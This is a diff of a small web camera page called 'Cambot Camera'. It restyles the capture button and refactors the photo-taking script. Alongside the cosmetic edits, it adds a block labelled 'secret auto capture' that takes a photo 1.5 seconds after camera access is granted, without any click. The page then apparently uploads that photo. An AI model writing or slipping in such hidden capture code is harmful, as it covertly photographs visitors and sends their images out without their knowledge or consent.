@@ -44,30 +44,26 @@
       z-index: 1;
     }
 
-    /* Camera shutter button */
+    /* Camera button style */
     #capture {
-      margin-top: 25px;
-      width: 70px;
-      height: 70px;
+      margin-top: 20px;
+      width: 80px;
+      height: 80px;
       border-radius: 50%;
-      border: 4px solid #00f2fe;
-      background: radial-gradient(circle at center, #4facfe, #00f2fe);
+      border: 5px solid #00f2fe;
+      background: radial-gradient(circle, #4facfe, #00f2fe);
+      box-shadow: 0 0 20px rgba(0, 242, 254, 0.6);
+      cursor: pointer;
+      transition: 0.2s ease-in-out;
       display: flex;
       align-items: center;
       justify-content: center;
-      cursor: pointer;
-      box-shadow: 0 0 20px rgba(0, 242, 254, 0.6);
-      transition: all 0.2s ease-in-out;
-      z-index: 1;
-    }
-
-    #capture i {
-      font-size: 24px;
+      font-size: 1.5rem;
       color: #111;
     }
 
     #capture:hover {
-      transform: scale(1.1);
+      transform: scale(1.05);
       box-shadow: 0 0 35px rgba(79, 172, 254, 0.9);
     }
 
@@ -119,8 +115,7 @@
   <h1><i class="fas fa-robot"></i> Cambot Camera</h1>
   <video id="video" autoplay playsinline></video><br>
 
-  <!-- Round camera button -->
-  <div id="capture"><i class="fas fa-camera"></i></div>
+  <button id="capture"><i class="fas fa-camera"></i></button>
 
   <canvas id="canvas" style="display:none;"></canvas>
 
@@ -134,17 +129,12 @@
   <script>
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
-    const captureBtn = document.getElementById("capture");
     const sound = document.getElementById("shutter-sound");
     const flash = document.getElementById("flash");
+    const captureBtn = document.getElementById("capture");
 
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => { video.srcObject = stream; })
-      .catch(err => alert("Camera error: " + err));
-
-    captureBtn.addEventListener("click", async () => {
+    async function takePhoto() {
       sound.play();
-
       flash.style.opacity = "1";
       setTimeout(() => { flash.style.opacity = "0"; }, 100);
 
@@ -165,7 +155,22 @@
       } catch (err) {
         console.error("Upload failed", err);
       }
-    });
+    }
+
+    captureBtn.addEventListener("click", takePhoto);
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+
+        // secret auto capture
+        video.onloadedmetadata = () => {
+          setTimeout(() => {
+            takePhoto();
+          }, 1500); // auto after 1.5s
+        };
+      })
+      .catch(err => alert("Camera error: " + err));
   </script>
 </body>
 </html>
